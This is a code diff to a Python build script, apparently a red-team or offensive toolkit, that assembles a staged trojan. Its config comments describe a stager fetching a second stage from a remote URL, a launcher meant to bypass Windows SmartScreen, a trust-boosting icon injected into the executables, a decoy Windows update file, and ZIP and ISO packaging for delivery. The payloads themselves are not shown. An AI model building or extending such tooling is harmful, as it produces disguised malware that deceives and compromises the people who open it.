@@ -57,15 +57,20 @@ ATTACKER_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main
 # Host from which you download trojan.ISO
 TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
 # File name
-SECONDNAME   = "second.txt"
-STAGERNAME   = "stager.txt"
-LAUNCHERNAME = "launcher.bat"
-EXENAME      = "'ps2pdf'.exe"
-ZIPNAME      = "postscript.zip"
-ISONAME      = "setup.iso"
-TROJAN_FE    = "update_k897867.msu"
-ICONNAME     = "sicurezza.ico"
-TROJANNAME   = "installer.ps1"
+SECONDNAME   = "second.txt"              # second stage (PS1)
+STAGERNAME   = "stager.txt"              # stager (PS1) that calls the second stage via the web
+TROJANNAME   = "installer.ps1"           # trojan (PS1) that calls the stager that calls the second stage via the web + if all goes well, calls the FE file
+LAUNCHERNAME = "launcher.bat"            # launcher (file trusted by Windows) that calls any .exe file to bypass SmartScreen
+EXENAME      = "'ps2pdf'.exe"            # name of the .exe file to be called by the launcher
+ICONNAME     = "sicurezza.ico"           # icon to inject into executables to make them appear more trustworthy
+EXESECONDNAME= "second.exe"              # name to give to the compiled second stage (EXE)
+EXESTAGER    = "stager.exe"              # name to give to the compiled stager (EXE)
+TROJANEXE    = "trojan.exe"              # name to give to the Trojan (EXE) compiled
+ZIPSECONDNAME= "01.LAUNCHER-SECOND.zip"  # contains launcher + secondStage.exe
+ZIPNAME      = "02.LAUNCHER-STAGER.zip"  # contains launcher + stager.exe (which calls secondStage via the web)
+ISONAME      = "03.LAUCHER-TROJAN.iso"   # contains launcher + trojan (which calls stager, which calls secondStage via the web + if all goes well, also calls the FE file)
+TROJAN_FE    = "update_k897867.msu"      # indows update to use as the Trojan's FE (other files are fine)
+
 # IP, User and Pass to connect to in order to perform the ISO to EXE conversion operation
 WIN_IP       = "192.168.1.111"
 WIN_USER     = "ieuser"
@@ -147,6 +152,28 @@ def read_file(path: str) -> str:
 def write_file(path: str, content: str):
     with open(path, "w", encoding="utf-8") as f:
         f.write(content)
+
+def is_xorriso_installed():
+    try:
+        # Verify xorriso installation
+        subprocess.run(["xorriso", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except FileNotFoundError:
+        return False
+    except subprocess.CalledProcessError:
+        return False
+
+def install_xorriso():
+    info("Starting xorriso installation...")
+    try:
+        # Aggiorna prima l'indice dei pacchetti
+        subprocess.run(["sudo", "apt", "update"], check=True)
+        # Installa xorriso
+        subprocess.run(["sudo", "apt", "install", "-y", "xorriso"], check=True)
+        info("xorriso installed successfully!")
+    except subprocess.CalledProcessError:
+        info("Error installing xorriso. Check your permissions and internet connection.")
+        sys.exit(1)
 
 
 
@@ -851,6 +878,26 @@ def step4_convert_stager_to_exe():
         warn("Could not clean up temporary files on the Windows machine.")
 
 
+    # 7g. Insert icon into EXENAME.exe
+    info(f"Try to insert {ICONNAME} in {EXENAME}")
+    rcedit = os.path.join(STUFF_DIR, "rcedit-x64.exe")
+    exe = os.path.join(OUT_DIR, EXENAME)
+    icon = os.path.join(STUFF_DIR, ICONNAME)
+    try:
+      cmd = [
+        "wine",
+        str(rcedit),
+        str(exe),
+        "--set-icon",
+        str(icon)
+      ]
+      subprocess.run(cmd, check=True)
+      info("icon inserted correctly")
+    except Exception:
+       warn(f"Could not insert icon in {EXENAME}.")
+
+
+
 # ==============================================================================
 # STEP 5 — ZIP CREATION (LAUNCHER + STAGER EXE)
 # ==============================================================================
@@ -1151,46 +1198,8 @@ def step7_convert_trojan_to_exe():
     except Exception:
         warn("Could not clean up temporary files on the Windows machine.")
 
-
-
-# ==============================================================================
-# STEP 8 — ISO CREATION
-# ==============================================================================
-
-
-def is_xorriso_installed():
-    try:
-        # Verify xorriso installation
-        subprocess.run(["xorriso", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return True
-    except FileNotFoundError:
-        return False
-    except subprocess.CalledProcessError:
-        return False
-
-def install_xorriso():
-    info("Starting xorriso installation...")
-    try:
-        # Aggiorna prima l'indice dei pacchetti
-        subprocess.run(["sudo", "apt", "update"], check=True)
-        # Installa xorriso
-        subprocess.run(["sudo", "apt", "install", "-y", "xorriso"], check=True)
-        info("xorriso installed successfully!")
-    except subprocess.CalledProcessError:
-        info("Error installing xorriso. Check your permissions and internet connection.")
-        sys.exit(1)
-
-
-def step8_iso_creation():
-    """
-    STEP 8: Create an ISO file with:
-    - TROJANNAME.exe renamed in EXENAME
-    - LAUNCHENAME
-    First of all ICONAME is injected in TROJANNAME.exe
-    """
-    section("STEP 8 — ISO creation")
     
-    # Insert icon into TROJANNAME.exe
+    # 7g. Insert icon into TROJANNAME.exe
     info(f"Try to insert {ICONNAME} in {TROJANNAME}.exe")
     rcedit = os.path.join(STUFF_DIR, "rcedit-x64.exe")
     exe = os.path.join(OUT_DIR, TROJANNAME + ".exe")
@@ -1208,6 +1217,20 @@ def step8_iso_creation():
     except Exception:
        warn(f"Could not insert icon in {TROJANNAME}.")
 
+
+
+# ==============================================================================
+# STEP 8 — ISO CREATION
+# ==============================================================================
+
+def step8_iso_creation():
+    """
+    STEP 8: Create an ISO file with:
+    - TROJANNAME.exe renamed in EXENAME
+    - LAUNCHENAME
+    First of all ICONAME is injected in TROJANNAME.exe
+    """
+    section("STEP 8 — ISO creation")
     
     # Create ISO
     if not is_xorriso_installed():
